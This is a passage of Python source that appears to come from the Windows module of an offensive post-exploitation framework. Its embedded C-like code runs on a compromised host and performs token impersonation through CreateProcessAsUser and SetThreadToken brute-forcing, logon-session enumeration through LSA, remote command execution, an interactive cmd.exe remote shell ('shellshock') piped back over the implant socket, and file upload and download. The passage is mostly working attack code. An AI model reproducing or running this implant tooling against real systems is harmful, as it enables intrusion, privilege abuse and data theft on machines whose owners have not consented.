            CreateEnvironmentBlock( &lpvEnv, hToken, 0x1 );
            GetUserProfileDirectory( hToken, szUserProfile, &dwSize );
            memset(lpProcessInformation, 0, 16);
            GetStartupInfoA(&lpStartupInfo);
            lpStartupInfo.dwFlags = 0x0001; // STARTF_USESHOWWINDOW
            lpStartupInfo.wShowWindow = 1;
            ImpersonateLoggedOnUser(hToken);
            ret = CreateProcessAsUser(lpUsername,lpDomain, lpPassword,0x00000001, NULL, lpCommandLine, dwCreationFlags, lpvEnv, szUserProfile, &lpStartupInfo, lpProcessInformation);
            err = GetLastError();
            sendint(ret);
            sendint(err);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = sint32(self.readint())
        err = sint32(self.readint())
        self.leave()

        return ret,err

    def EnumSessions(self):

        vars = {}
        code = """

        #import "remote", "Secur32.dll|LsaEnumerateLogonSessions" as "LsaEnumerateLogonSessions"
        #import "remote", "Secur32.dll|LsaGetLogonSessionData" as "LsaGetLogonSessionData"
        #import "remote", "Secur32.dll|LsaFreeReturnBuffer" as "LsaFreeReturnBuffer"

        #import "local", "writeblock2self" as "writeblock2self"
        #import "local", "memcpy" as "memcpy"
        #import "local", "debug" as "debug"
        #import "local", "sendint" as "sendint"

        struct LUID {
            int  LowPart;
            int  HighPart;
        };

        struct LSA_UNICODE_STRING {
          int  Length;
          int  Buffer; // wide char
        };

        struct LARGE_INTEGER {
          int lower;
          int higher;

        };

        struct LSA_LAST_INTER_LOGON_INFO {
          struct LARGE_INTEGER LastSuccessfulLogon;
          struct LARGE_INTEGER LastFailedLogon;
          int                  FailedAttemptCountSinceLastSuccessfulLogon;
        };

        struct SECURITY_LOGON_SESSION_DATA {
          int                              Size;                  // 00
          struct LUID                      LogonId;               // 04
          struct LSA_UNICODE_STRING        UserName;              // 12
          struct LSA_UNICODE_STRING        LogonDomain;
          struct LSA_UNICODE_STRING        AuthenticationPackage;
          int                              LogonType;
          int                              Session;
          int                              Sid;
          struct LARGE_INTEGER             LogonTime;
          struct LSA_UNICODE_STRING        LogonServer;
          struct LSA_UNICODE_STRING        DnsDomainName;
          struct LSA_UNICODE_STRING        Upn;
          int                              UserFlags;
          struct LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
          struct LSA_UNICODE_STRING        LogonScript;
          struct LSA_UNICODE_STRING        ProfilePath;
          struct LSA_UNICODE_STRING        HomeDirectory;
          struct LSA_UNICODE_STRING        HomeDirectoryDrive;
          struct LARGE_INTEGER             LogoffTime;
          struct LARGE_INTEGER             KickOffTime;
          struct LARGE_INTEGER             PasswordLastSet;
          struct LARGE_INTEGER             PasswordCanChange;
          struct LARGE_INTEGER             PasswordMustChange;
        };

        void main()
        {
            int LogonSessionCount;

            struct LUID *LogonSessionList;
            struct SECURITY_LOGON_SESSION_DATA *sessionData;
            struct LSA_UNICODE_STRING wusername;
            struct LARGE_INTEGER hola;

            int rVal;
            int *session;
            char *username;
            int *p;
            int *aux;
            int aux_int;
            int i;
            short *str_len;

            LogonSessionList = 0;
            rVal = LsaEnumerateLogonSessions(&LogonSessionCount,&LogonSessionList);
            sendint(rVal);

            if (rVal != 0){
                return;
            }

            sendint(LogonSessionCount);
            i = 0;

            while(i<LogonSessionCount) {
                session = LogonSessionList + i;

                rVal = LsaGetLogonSessionData(session, &sessionData);
                sendint(rVal);

                if (rVal == 0) {
                    username = sessionData;

                    p = username + 4; //sessionData->LogonId.Lowpart
                    sendint(*p);
                    p = username + 8; //sessionData->LogonId.Highpart
                    sendint(*p);

                    p = username + 16; //sessionData->Username.Buffer
                    aux = *p;
                    str_len = username + 12;

                    sendint(*str_len);
                    writeblock2self(aux, *str_len);

                    // Sending Logon Domain
                    p = username + 24; //sessionData->LogonDomain.Buffer
                    aux = *p;
                    str_len = username+20;
                    sendint(*str_len);
                    writeblock2self(aux, *str_len);

                    // Sending Authentication Type
                    p = username + 32; //sessionData->LogonDomain.Buffer
                    aux = *p;
                    str_len = username + 28;
                    sendint(*str_len);
                    writeblock2self(aux, *str_len);

                    // Sending Logon Type
                    p = username + 36; //sessionData->LogonType
                    aux_int = *p;
                    sendint(aux_int);

                    LsaFreeReturnBuffer(sessionData);
                }

                i = i + 1;
            }

            LsaFreeReturnBuffer(LogonSessionList);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        ret = self.readint()

        if ret != 0:
            self.leave()
            return (ret, None)
        else:
            sessions = []
            sessions_number = self.readint()

            for i in range(0, sessions_number):

                session = {}
                ret = self.readint()
                if ret != 0:
                    self.log_error('EnumSessions(): LsaGetLogonSessionData()returned 0x%x' % ret)
                    continue

                logonid = []
                logonid.append(self.readint())
                logonid.append(self.readint())
                session['logonid']    = logonid
                session['username']   = self.read_uni_string()
                session['domain']     = self.read_uni_string()
                session['auth_type']  = self.read_uni_string()
                session['logon_type'] = self.readint()
                sessions.append(session)

        self.leave()
        return (0, sessions)


    def popen2(self,command):
        """
        runs a command and returns the result
        Note how it uses TCP's natural buffering, and
        doesn't require a ping-pong like protocol.
        """
        devlog("win32", "Popen2: %s"%command)
        vars={}
        vars["command"]=command

        """
        Uses better popen techniques than real popen()
        Also gets stderr, theoretically
        This function took a long time to write. In the future, remember that:
        1. CreateProcessA needs to be called with inheritance set to 1, else, broken pipe results
        2. You have to close the writable stdout pipe or the pipe blocks on any read. Do this
           AFTER you call CreateProcessA to send it to a child process

        """

        if command=="":
            return "You need to enter in a command."

        cmdexe=self.getComSpec()
        #cmdexe="C:\\winnt\\temp\\testmemcpy.exe"
        vars["cmdexe"]=cmdexe

        #the result here is both inheritable
        (ret,hChildStdinRd,hChildStdinWr)=self.CreatePipe()
        if ret==0:
            #failed to create pipe
            return "Failed to create pipe!"

        #print "Pipe created: %x %x"%(hChildStdinRd,hChildStdinWr)

        #Create a non-inheritable duplicate
        (ret,hChildStdinWrDup)=self.DuplicateHandle(hChildStdinWr)
        if ret==0:
            return "Failed to duplicate handle for writing"

        #print "Handle duplicated: %x"%hChildStdinWrDup

        #we need to close ours, since we don't want the child to inherit it!
        #print "Closing %x"%hChildStdinWr

        self.CloseHandle(hChildStdinWr)

        (ret,hChildStdoutRd,hChildStdoutWr)=self.CreatePipe()
        if ret==0:
            #failed to create pipe
            return "Failed to create stdout pipe!"

        #print "Pipe created: %x %x"%(hChildStdoutRd,hChildStdoutWr)

        #print "Duplicating: %x"%(hChildStdoutRd)

        (ret,hChildStdoutRdDup)=self.DuplicateHandle(hChildStdoutRd)
        if ret==0:
            return "Failed to duplicate handle for reading"

        #print "Closing %x"%hChildStdoutRd
        self.CloseHandle(hChildStdoutRd)

        command="cmd.exe /c "+command


        vars={}
        vars["command"]=command
        vars["cmdexe"]=cmdexe
        vars["stdin"]=hChildStdinRd
        vars["stdout"]=hChildStdoutWr
        code="""
        #import "local","sendint" as "sendint"
        #import "remote","kernel32.dll|GetStartupInfoA" as "getstartupinfoa"
        #import "remote","kernel32.dll|CreateProcessA" as "createprocessa"
        #import "string","cmdexe" as "cmdexe"
        #import "string","command" as "command"
        #import "local", "memset" as "memset"
        #import "int", "stdin" as "stdin"
        #import "int", "stdout" as "stdout"
        //#import "local", "debug" as "debug"

        struct STARTUPINFO {
        int cb;
        char * lpReserved;
        char * lpDesktop;
        char * lpTitle;
        int dwX;
        int dwY;
        int dwXSize;
        int dwYSize;
        int dwXCountChars;
        int dwYCountChars;
        int dwFillAttribute;
        int dwFlags;
        short int wShowWindow;
        short int cbReserved2;
        int * lpReserved2;
        int hStdInput;
        int hStdOutput;
        int hStdError;
        };

        //void main2() {
        //  debug();
        //  main2();
        //}

        void main() {
          struct STARTUPINFO si;
          int inherithandles;
          int i;
          char pi[32];

          memset(pi,0,16);
          inherithandles=1;
          getstartupinfoa(&si);
          si.dwFlags=0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
          si.wShowWindow=0;
          si.hStdInput=stdin;
          si.hStdOutput=stdout;
          si.hStdError=stdout;
          // CreateProcess: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createprocess.asp
          i=createprocessa(cmdexe,command,0,0,inherithandles,0,0,0,&si,pi);
          sendint(i);
        }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        if ret!=1:
            return "Failed to CreateProcessA on cmd.exe!"
        else:
            pass
            #print "Process spawned"


        #must close this side of the handle before reading from pipe
        self.CloseHandle(hChildStdoutWr)
        #print "Closed %x"%hChildStdoutWr

        retdata=self.readfromfd(hChildStdoutRdDup,-1)
        retdata=self.localize_string(retdata)
        #cleanup
        self.CloseHandle(hChildStdoutRdDup)
        self.CloseHandle(hChildStdinWrDup)
        self.CloseHandle(hChildStdinRd)

        return retdata

    def usingISAPI(self):
        """
	Returns True if we are using an ISAPI to tunnel our socket over.
        This means some things must be done differently, or won't work
        at all (i.e. mosdefmigrate/shellshock don't work).
	"""
        if self.isapidict!={}: return True
        return False

    def shellshock(self, logfile=None):
        """
        win32 cmd.exe shellshock, modified from dave's popen2
        """
        if self.usingISAPI():
            self.log("shellshock is not supported when doing ISAPI mode transport")
            return


        vars={}
        cmdexe=self.getComSpec()
        vars["cmdexe"]=cmdexe

        (ret,hChildStdinRd,hChildStdinWr)=self.CreatePipe()
        if ret==0:
            return "Failed to create pipe!"
        (ret,hChildStdinWrDup)=self.DuplicateHandle(hChildStdinWr)
        if ret==0:
            return "Failed to duplicate handle for writing"
        (ret,hChildStdoutRd,hChildStdoutWr)=self.CreatePipe()
        if ret==0:
            return "Failed to create stdout pipe!"
        (ret,hChildStdoutRdDup)=self.DuplicateHandle(hChildStdoutRd)
        if ret==0:
            return "Failed to duplicate handle for reading"

        self.CloseHandle(hChildStdoutRd)
        self.CloseHandle(hChildStdinWr)

        command="cmd.exe"

        self.clearfunctioncache()
        vars={}
        vars["command"]=command
        vars["cmdexe"]=cmdexe
        vars["stdin"]=hChildStdinRd
        vars["stdout"]=hChildStdoutWr
        vars["mosdefd"]=self.fd
        vars["readfd"]=hChildStdoutRdDup
        vars["writefd"]=hChildStdinWrDup

        code="""
        #import "remote","kernel32.dll|GetStartupInfoA" as "getstartupinfoa"
        #import "remote","kernel32.dll|CreateProcessA" as "createprocessa"
        #import "remote", "kernel32.dll|ReadFile" as "readfile"
        #import "remote", "kernel32.dll|WriteFile" as "writefile"
        #import "remote", "kernel32.dll|PeekNamedPipe" as "peeknamedpipe"
        #import "remote", "ws2_32.dll|select" as "select"
        #import "remote", "ws2_32.dll|recv" as "recv"
        #import "remote", "kernel32.dll|CloseHandle" as "closehandle"
        #import "local", "memset" as "memset"
        #import "local", "writeblock" as "writeblock"
        #import "local", "sendint" as "sendint"
        #import "string","cmdexe" as "cmdexe"
        #import "string","command" as "command"
        #import "int", "stdin" as "stdin"
        #import "int", "stdout" as "stdout"
        #import "int", "mosdefd" as "mosdefd"
        #import "int", "readfd" as "readfd"
        #import "int", "writefd" as "writefd"

        #import "local", "debug" as "debug"

        struct STARTUPINFO {
        int cb;
        char * lpReserved;
        char * lpDesktop;
        char * lpTitle;
        int dwX;
        int dwY;
        int dwXSize;
        int dwYSize;
        int dwXCountChars;
        int dwYCountChars;
        int dwFillAttribute;
        int dwFlags;
        short int wShowWindow;
        short int cbReserved2;
        int * lpReserved2;
        int hStdInput;
        int hStdOutput;
        int hStdError;
        };

        struct timeval {
                int tv_sec;
                int tv_usec; };

        void main() {
          struct timeval tv;
          struct STARTUPINFO si;
          int inherithandles;
          int i;
          int n;
          int noread;
          int numread;
          int numwritten;
          char in[512];
          char out[512];
          char pi[32];
          int fd_set[2];
          char check1;
          char check2;

          char peekcheck[2];

          memset(pi,0,16);
          inherithandles = 1;
          getstartupinfoa(&si);
          si.dwFlags = 0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
          si.wShowWindow = 0;
          si.hStdInput = stdin;
          si.hStdOutput = stdout;
          si.hStdError = stdout;
          i = createprocessa(cmdexe,command,0,0,inherithandles,0,0,0,&si,pi);
          sendint(i);

          // close stdoutwr and stdinrd
          closehandle(stdout);
          closehandle(stdin);

          // main io loop (bit of a kludge, but it'll do for now)
          while(1)
          {

            fd_set[0] = 1; // actual n
            fd_set[1] = mosdefd;
            n = 2; // ignored
            tv.tv_sec = 0;
            tv.tv_usec = 10;
            // very small timeout
            i = select(n, &fd_set, 0, 0, &tv);
            if (i != 0)
            {
              memset(&in, 0, 512);
              i = recv(mosdefd, in, 511, 0);
              //dump to filehandle
              writefile(writefd, in, i, &numwritten, 0);
            }

            //debug();
            i = 1;
            // dump response from cmd.exe back to remote
            while (i != 0)
            {
              memset(&peekcheck, 0, 2);
              noread=0;
              n = peeknamedpipe(readfd, peekcheck, 1, &numread, &numwritten, 0);
              if(n == 0)
              {
                // process is gone, prolly exited :P
                writeblock(mosdefd, &n, 4); // be shellshock_loop non-xor compatible
                return;
              }
              check1 = peekcheck[0];
              check2 = peekcheck[1];
              if(check1 == check2)
              {
                noread = 1;
                i = 0;
              }
              numread = 0;
              if (noread == 0)
              {
                memset(&out, 0, 512);
                i = readfile(readfd, out, 511, &numread, 0);
              }
              // i want && support !
              if(i != 0)
              {
                if (numread != 0)
                {
                  //sendint(numread);
                  writeblock(mosdefd, &numread, 4); // be shellshock_loop non-xor compatible
                  writeblock(mosdefd, out, numread);
                }
              }
            }
          }
        }

        """
        # sendint and readint use xorkey!!!
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        # createprocess result
        ret = self.readint()

        # shellshock loop
        ret = self.shellshock_loop(endian="little", logfile=logfile)

        self.leave()

        self.CloseHandle(hChildStdoutRdDup)
        self.CloseHandle(hChildStdinWrDup)
        return

    def ReadFile(self,fd,size=1000):
        """
        ReadFile(fd)
        """
        vars={}
        vars["fd"]=fd
        vars["size"]=size
        code="""
        #import "remote", "kernel32.dll|ReadFile" as "ReadFile"
        #import "local","writeblock2self" as "writeblock2self"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local","sendint" as "sendint"
        #import "int","fd" as "fd"
        #import "int","size" as "size"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"

        void main() {
          int ret;
          int err;
          char *outbuf;
          int sizeread;

          outbuf=malloc(size);
          ret=ReadFile(fd,outbuf,size,&sizeread,0);
          err=GetLastError();
          sendint(ret);
          if (ret!=0) {
            writeblock2self(outbuf,sizeread);
          }
          else {
            sendint(err);
          }
          free(outbuf);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret:
            val=self.readblock() #data read
        else:
            val=self.readint() #GetLastErr()
        self.leave()
        return ret,val

    def readfilefromfd(self,fd,filesize,outfile):
        """
        Reads from an open fd on the remote host
        into an open file object on the localhost
        -1 size is read till closed.
        """

        vars={}
        vars["bufsize"]=filesize
        vars["filefd"]=fd
        code="""
        #import "remote", "kernel32.dll|ReadFile" as "readfile"
        #import "local", "writeblock2self" as "writeblock2self"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "filefd" as "filefd"
        #import "local","sendint" as "sendint"

        void main () {
        char buf[1001];
        int numread;

        """
        if filesize!=-1:
            code+="""
            // used when we know what size we are reading...
            // such as for a file
            int left;

            left=bufsize;
            //debug();
            while (left>1000) {
            readfile(filefd,buf,1000,&numread,0);
            writeblock2self(buf,1000);
            left=left-1000;
            }

            if (left>0) {
            readfile(filefd,buf,left,&numread,0);
            writeblock2self(buf,left);
            }
            """
        else:
            #this is the code used in popen2()
            code+="""
            // used when we have no idea what size we are reading...
            // sending a 0 sized block ends our transmission
            int i;

            i=1;
            while (i!=0) {
            i=readfile(filefd,buf,1000,&numread,0);
            sendint(numread);
            writeblock2self(buf,numread);
            }

            """
        code+="""

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        #this is not good...
        if filesize!=-1:
            data=self.readbufintofile(filesize,outfile)
        else:
            data=self.readblocksintofile(outfile)
        self.leave()
        return 1

    def readfromfd(self,fd,filesize):
        """ Reads from an open fd on the remote host
            -1 size means read till closed
        """

        vars={}
        vars["bufsize"]=filesize
        vars["filefd"]=fd
        code="""
        #import "remote", "kernel32.dll|ReadFile" as "readfile"
        #import "local", "writeblock2self" as "writeblock2self"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "filefd" as "filefd"
        #import "local","sendint" as "sendint"

        void main () {
        char buf[1001];
        int numread;

        """
        if filesize!=-1:
            code+="""
                // used when we know what size we are reading...
                // such as for a file
                int left;

                left=bufsize;
                //debug();
                while (left>1000) {
                    readfile(filefd,buf,1000,&numread,0);
                    writeblock2self(buf,1000);
                    left=left-1000;
                }

                if (left>0) {
                    readfile(filefd,buf,left,&numread,0);
                    writeblock2self(buf,left);
                }
            """
        else:
            code+="""
                // used when we have no idea what size we are reading...
                // sending a 0 sized block ends our transmission
                int i;

                i=1;
                while (i!=0) {
                    i=readfile(filefd,buf,1000,&numread,0);
                    sendint(numread);
                    writeblock2self(buf,numread);
                }

                """
        code+="""

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        if filesize!=-1:
            data=self.readbuf(filesize)
        else:
            data=self.readblocks()
        self.leave()
        return data

    def writefiletofd(self, fd, infile):
        """
        Writes the data from infile to fd (on remote side)
        """
        vars    = {}
        oldtell = infile.tell()
        infile.seek(0, 2) # seek to the end
        datalen = infile.tell()
        infile.seek(oldtell)

        vars["bufsize"] = datalen
        vars["filefd"]  = fd
        self.log("[+] Writing %d bytes to FD(0x%x)" % (datalen, fd))

        code = """
            #import "local",  "readdatafromself" as "readdatafromself"
            #import "remote", "kernel32.dll|WriteFile" as "WriteFile"

            #import "local", "sendint" as "sendint"

            #import "int", "bufsize" as "bufsize"
            #import "int", "filefd" as "filefd"

            void main () {
                char buf[1001];
                int left;
                int numwritten;
                int ret;

                left = bufsize;
                while (left > 1000) {
                    ret = readdatafromself(buf, 1000);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }

                    ret = WriteFile(filefd, buf, 1000, &numwritten, 0);
                    if (ret == 0) {
                        sendint(0);
                        return 0;
                    }
                    else {
                        left = left - 1000;
                    }
                }

                if (left > 0) {
                    ret = readdatafromself(buf, left);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }

                    ret = WriteFile(filefd, buf, left, &numwritten, 0);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }
                }

                sendint(1);
            }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.writebuffromfile(infile)
        self.leave()

        ret = sint32(self.readint(signed = True))
        return ret

    def upload_data(self, data, filename):
        """
        Upload data in a string buffer to a file
        returns True if successful, False otherwise
        """
        self.log("trying to create %s"%(filename))
        newfile=self.CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,None,
                                CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL)
        if newfile<0:
            return False

        #now write the data directly down the pipe
        self.log("Writing to FD %x"%newfile)
        self.writetofd(newfile,data)
        ret=self.CloseHandle(newfile)
        if sint32(ret)==-1:
            self.log("Could not close file?")
            return False

        self.log("Uploaded file successfully")
        return True


    def writetofd(self,fd,data):
        """
        Writes all the data in data to fd
        """

        vars={}
        vars["bufsize"]=len(data)
        vars["filefd"]=fd
        self.log("Writing %d bytes to %x"%(len(data),fd))

        code="""
        #import "local", "readdatafromself" as "readdatafromself"
        #import "remote", "kernel32.dll|WriteFile" as "WriteFile"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "filefd" as "filefd"

        void reliablewrite(int fd,char * buffer,int size) {
           int numwritten;
           int sizeleft;
           char * p;

           p=buffer;
           sizeleft=size;
           while (sizeleft > 0) {
               numwritten=0;
               WriteFile(fd,p,sizeleft,&numwritten,0);
               sizeleft=sizeleft-numwritten;
               p=p+numwritten;
           }
        }

        void main () {
        char buf[1001];
        int left;
        int numwritten;

        left=bufsize;
        //debug();
        while (left>1000) {
        readdatafromself(buf,1000);
        reliablewrite(filefd,buf,1000);
        left=left-1000;
        }

        if (left>0) {
           readdatafromself(buf,left);
           reliablewrite(filefd,buf,left);
           //WriteFile(filefd,buf,left,&numwritten,0);
           }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()
        return

    def ExitThread(self,exitcode):
        """
        Calls exit thread with the exitcode
        """
        return self.singleVariableFunction("kernel32.dll|ExitThread",exitcode,nosend=1)

    def SetThreadToken(self,token,thread=0):
        """
        Sets the thread token (0 for reverttoself)
        thread is actually supposed to be a pointer to a thread...
        on fail returns 0
        """
        #set primary token if we are none
        if token==None:
            token=0
        return self.twoVariableFunction("advapi32.dll|SetThreadToken",thread,token)

    def getComputerName(self):
        """
        GetComputerName
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/getcomputernameex.asp
        """

        vars={}
        code="""
        #import "remote", "kernel32.dll|GetComputerNameA" as "GetComputerName"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        void main() {
          int ret;
          char outbuf[51];
          int len;

          len=50;

          ret=GetComputerName(outbuf,&len);

          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }
        }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readint()
        retbuffer=""
        if ret!=0:
            retbuffer=self.readstring()
        else:
            self.log("getComputerName failed?")
            retbuffer="Unknown!"
        self.leave()
        return retbuffer

    def whoami(self, name_format=NameSamCompatible):
        """
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/getusernameex.asp
        returns the name of the current thread's user and domain
        """

        vars={}
        code="""
        #import "remote", "secur32.dll|GetUserNameExA" as "GetUserNameExA"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "int", "NameFormat" as "NameFormat"

        void main() {
          int ret;
          char outbuf[1000];
          int len;
          len=1000;
          ret=GetUserNameExA(NameFormat,outbuf,&len);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }
        }
        """
        self.clearfunctioncache()
        vars['NameFormat'] = name_format
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readint()
        retbuffer=""
        if ret!=0:
            retbuffer=self.readstring()
        else:
            self.log("[EE] whoami failed?")
            retbuffer="Unknown!"
        self.leave()
        return retbuffer

    def getppid(self):
        self.log("Not supported on win32node")
        return

    def getpid(self):

        vars={}
        code="""
        #import "remote", "kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"

        void main() {
          int ret;
          ret=GetCurrentProcessId();
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def getthreadsinfo(self,maxtoken=0xf00):
        self.log("Get threads information - starting")
        vars={}
        code="""
        #import "remote", "secur32.dll|GetUserNameExA" as "GetUserNameExA"
        #import "remote", "advapi32.dll|SetThreadToken" as "SetThreadToken"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        void main() {
          int ret;
          char outbuf[1000];
          int len;
          int NameFormat;

          NameFormat=2; //NameSamCompatible
          int token;
          token=0;

          while (token<MAXTOKEN) {
             ret=SetThreadToken(0,token);
             if (ret!=0) {
                 sendint(token);
                 memset(outbuf, 0 , 1000);
                 len=1000;
                 GetUserNameExA(NameFormat,outbuf,&len);
                 sendstring(outbuf);
             }
             token=token+4;
          }
          sendint(-1);
        }
        """.replace("MAXTOKEN","0x%x"%maxtoken)
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=0
        results=[]
        while ret != -1:
            ret=sint32(self.readint())
            retbuffer=""
            if ret != -1:
                retbuffer=self.readstring()
                results.append((ret,retbuffer))
        self.leave()
        self.log("Found %d thread tokens"%len(results))
        return results


    ###########
    #Socket calls

    def setblocking(self,fd,blocking):
        code="""
        #import "int", "blocking" as "blocking"
        #import "int", "FIONBIO" as "FIONBIO"
        #import "int", "sock" as "sock"
        #import "remote", "ws2_32.dll|ioctlsocket" as "ioctlsocket"

        void main() {
        int NonBlock;
        NonBlock=blocking;

        // Blocking   = 0
        // Noblocking = 1
        ioctlsocket(sock, FIONBIO, &NonBlock);
        }
        """
        vars={}

        if blocking:
            blocking = 0
        else:
            blocking = 1

        vars["blocking"] = blocking
        vars["sock"]     = fd
        vars["FIONBIO"]  = 0x8004667eL

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def setsockopt(self,fd,option,arg):
        code="""
        #import "remote", "ws2_32.dll|setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "int", "sock" as "sock"

        void main() {
          int arg2;
          arg2=arg;
          setsockopt(sock,level, option,&arg2, 4);
        }
        """
        vars={}
        vars["option"] = option
        vars["arg"]    = arg
        vars["sock"]   = fd
        vars["level"]  = 0xffff #SOL_SOCKET
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
        #import "remote", "ws2_32.dll|recv" as "recv"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "local", "debug" as "debug"

        void main()
        {
          int i;
          int err;
          char buf[1000];
          int wanted;
          //debug();
          //flags set to zero here
          wanted=length;
          while (wanted > 0 ) {
            if (wanted < 1000) {
              i=recv(fd,buf,wanted,0);
            }
            else
            {
              i=recv(fd,buf,1000,0);
            }

            if (i<0)
             {
               //if our socket is Nonblocking, we might fall into this situtation.
               err=GetLastError();
               if (err!=10035) {
                 //some kind of error that is not EWOULDBLOCK
                 writeblock2self(buf,0);
                 wanted=0;
               }
             }
           else
           {
             writeblock2self(buf,i);
             wanted=wanted-i;
           }

          }
        }
        """
        vars={}
        vars["fd"]=fd
        vars["length"]=int(length)
        self.clearfunctioncache()
        message=self.compile(code,vars)
        return message

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        #print "Recieving %d bytes from fd %d"%(length,fd)
        message=self.getrecvcode(fd,length)
        self.sendrequest(message)
        self.leave()
        #reliable recv
        buffer=self.node.parentnode.recv(self.connection,length)
        #print "Recv Got %d: %s"%(len(buffer),prettyprint(buffer))
        return buffer

    def recv_lazy(self,fd,timeout=None,length=1000):
        """
        Get whatever is there.

        Return "" on nothing there, and exception socket.error on fail.

        """

        if timeout==None:
            timeout=0 #immediately return
        if length>1000:
            length=1000

        devlog("win32","In recv_lazy fd=%d timeout=%d length=%d"%(fd,timeout,length))


        code="""
        #import "remote", "ws2_32.dll|select" as "select"
        #import "remote", "ws2_32.dll|recv" as "recv"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "sendint" as "sendint"
        #import "int", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"
        #import "local", "debug" as "debug"

        struct  fd_set {
                   int fd_count;
                   int fd;
        };
        struct timeval {
                int tv_sec;
                int tv_usec; };
        void main()
         {
        int i;
        char buf[1000];
        int r;
        struct fd_set readfd;
        struct fd_set errorfd;
        struct timeval tv;

        readfd.fd_count=1;
        readfd.fd = fd; // fd
        errorfd.fd_count=1;
        errorfd.fd = fd; // fd

        tv.tv_usec= 0;
        tv.tv_sec = timeout;


        //timeout is in seconds
        i=select(1, &readfd, 0, &errorfd, &tv);
        sendint(i);
        if( i >0 ) {
                //debug();
                // Theoretically, we dont need to check if fd is our fd, cause we
                // only send one fd, our fd :D
                i=recv(fd, buf, length,0);
                sendint(i);
                if (i>0)
                {
                   senddata2self(buf,i);
                } //end if i
            } //end if i
        } //end main
        """
        vars={}
        vars["fd"]=fd
        vars["timeout"]=timeout
        vars["length"]=length
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        select_value=sint32(self.readint())
        buffer=""
        raise_socket_error=False
        if select_value>0:
            #We
            recv_value=sint32(self.readint())
            if recv_value>0:
                buffer=self.readblock()
            else:
                raise_socket_error=True
        self.leave()

        if raise_socket_error:
            #we got an error doing our RECV
            raise socket.error

        #if select_value is <=0, then we normally would raise a Timeout, but
        #because this is recv_lazy, we just return empty string

        devlog("win32","recv_lazy got %d bytes"%len(buffer))
        return buffer

    def iswritable(self,fd,timeout=0):
        """
        Checks to see if fd is writable
        """

        if timeout==None:
            timeout=0
        code="""
         #import "remote", "ws2_32.dll|select" as "select"
         #import "local", "sendint" as "sendint"
         #import "int", "fd" as "fd"
         #import "int", "timeout" as "timeout"
         #import "local", "debug" as "debug"

         struct  fd_set {
                    int fd_count;
                    int fd;
         };
         struct timeval {
                 int tv_sec;
                 int tv_usec; };
         void main()
          {
         int i;
         char buf[1000];
         int r;
         struct fd_set readfd;
         struct timeval tv;

         readfd.fd_count=1;
         readfd.fd = fd;

         tv.tv_usec= 0;
         tv.tv_sec = timeout;

         //timeout is in seconds
         i=select(1, 0, &readfd, 0, &tv);

         if( i > 0 ) {
                 //debug();
                 // Theoretically, we dont need to check if fd is our fd, cause we
                 // only send one fd, our fd :D
                 sendint(1);
         }
         else
         {
         //socket is not active (waiting for a recv)
                 sendint(0);
         }
         }

         """
        vars={}
        vars["fd"]=fd
        vars["timeout"]=timeout
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        #print "Before readblock"
        ret=self.readint()
